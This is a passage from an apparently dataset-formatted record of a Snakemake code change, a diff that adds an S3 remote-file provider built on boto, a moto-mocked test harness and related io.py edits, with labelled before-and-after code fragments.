b/snakemake/remote_providers/RemoteObjectProvider.py\nnew file mode 100644\nindex 0000000..b040e87\n--- /dev/null\n+++ b/snakemake/remote_providers/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a/snakemake/remote_providers/S3.py b/snakemake/remote_providers/S3.py\nnew file mode 100644\nindex 0000000..77b15ea\n--- /dev/null\n+++ b/snakemake/remote_providers/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^/]*)/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket/key': %s\" %\n+                                  self.file())\ndiff --git a/snakemake/remote_providers/__init__.py b/snakemake/remote_providers/__init__.py\nnew file mode 100644\nindex 0000000..8b13789\n--- /dev/null\n+++ b/snakemake/remote_providers/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a/snakemake/remote_providers/implementations/S3.py b/snakemake/remote_providers/implementations/S3.py\nnew file mode 100644\nindex 0000000..c6cb622\n--- /dev/null\n+++ b/snakemake/remote_providers/implementations/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize / float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a/snakemake/rules.py b/snakemake/rules.py\nindex 3608167..5324eeb 100644\n--- a/snakemake/rules.py\n+++ b/snakemake/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a/snakemake/workflow.py b/snakemake/workflow.py\nindex b035bc3..833bd90 100644\n--- a/snakemake/workflow.py\n+++ b/snakemake/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import update_config\n \ndiff --git a/tests/test_remote/S3Mocked.py b/tests/test_remote/S3Mocked.py\nnew file mode 100644\nindex 0000000..d8cc489\n--- /dev/null\n+++ b/tests/test_remote/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a/tests/test_remote/Snakefile b/tests/test_remote/Snakefile\nnew file mode 100644\nindex 0000000..b2e1298\n--- /dev/null\n+++ b/tests/test_remote/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket/out.txt ./\")\n+\n+rule split:\n+    input: remote('test-remote-bucket/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket/prefix')\n+        for f in os.listdir(os.getcwd()+\"/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket/\"+f, \"test-remote-bucket/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm ./motoState.p\")\n+\n+onerror:\n+    shell(\"rm ./motoState.p\")\n\\ No newline at end of file\ndiff --git a/tests/test_benchmark/expected-results/test.benchmark.json b/tests/test_remote/__init__.py\nsimilarity index 100%\nrename from tests/test_benchmark/expected-results/test.benchmark.json\nrename to tests/test_remote/__init__.py\ndiff --git a/tests/test_remote/expected-results/out.txt b/tests/test_remote/expected-results/out.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- /dev/null\n+++ b/tests/test_remote/expected-results/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/test_remote/test.txt b/tests/test_remote/test.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- /dev/null\n+++ b/tests/test_remote/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/tests.py b/tests/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd180..6b53573\n--- a/tests/tests.py\n+++ b/tests/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n", "files": {"/snakemake/dag.py": {"changes": [{"diff": "\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n", "add": 1, "remove": 1, "filename": "/snakemake/dag.py", "badparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"], "goodparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]}, "/snakemake/io.py": {"changes": [{"diff": "\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"], "goodparts": ["import functools", "from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException", "import snakemake.remote_providers.S3 as S3"]}, {"diff": "\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n", "add": 45, "remove": 3, "filename": "/snakemake/io.py", "badparts": ["    def protected(self):", "        return self.exists and not os.access(self.file, os.W_OK)", "        if not self.exists and lstat(self.file):"], "goodparts": ["    @_referToRemote", "    def exists_local(self):", "        return os.path.exists(self.file)", "    @property", "    def exists_remote(self):", "        return (self.is_remote and self.remote_object.exists())", "    def protected(self):", "        return self.exists_local and not os.access(self.file, os.W_OK)", "    @property", "    @_referToRemote", "        return lstat(self.file).st_mtime", "    @property", "    def flags(self):", "        return getattr(self._file, \"flags\", {})", "    @property", "    def mtime_local(self):", "    @_referToRemote", "    @property", "    def size_local(self):", "        self.check_broken_symlink()", "        return os.path.getsize(self.file)", "        if not self.exists_local and lstat(self.file):", "    def download_from_remote(self):", "        logger.info(\"Downloading from remote: {}\".format(self.file))", "        if self.is_remote and self.remote_object.exists():", "            self.remote_object.download()", "        else:", "            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")", "    def upload_to_remote(self):", "        logger.info(\"Uploading to remote: {}\".format(self.file))", "        if self.is_remote and not self.remote_object.exists():", "            self.remote_object.upload()", "        else:", "            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]}, {"diff": "\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["    def touch(self):", "            lutime(self.file, None)"], "goodparts": ["    def touch(self, times=None):", "        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"", "            lutime(self.file, times)"]}, {"diff": "\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n", "add": 12, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["        return IOFile(apply_wildcards(f, wildcards,", "                      rule=self.rule)"], "goodparts": ["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})", "        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,", "                                      rule=self.rule)", "        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))", "        return fileWithWildcardsApplied"]}, {"diff": "\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n", "add": 9, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["        return flag in value.flags"], "goodparts": ["        return flag in value.flags and value.flags[flag]", "    if isinstance(value, _IOFile):", "        return flag in value.flags and value.flags[flag]", "def get_flag_value(value, flag_type):", "    if isinstance(value, AnnotatedString):", "        if flag_type in value.flags:", "            return value.flags[flag_type]", "        else:", "            return None"]}, {"diff": "\n     A flag for 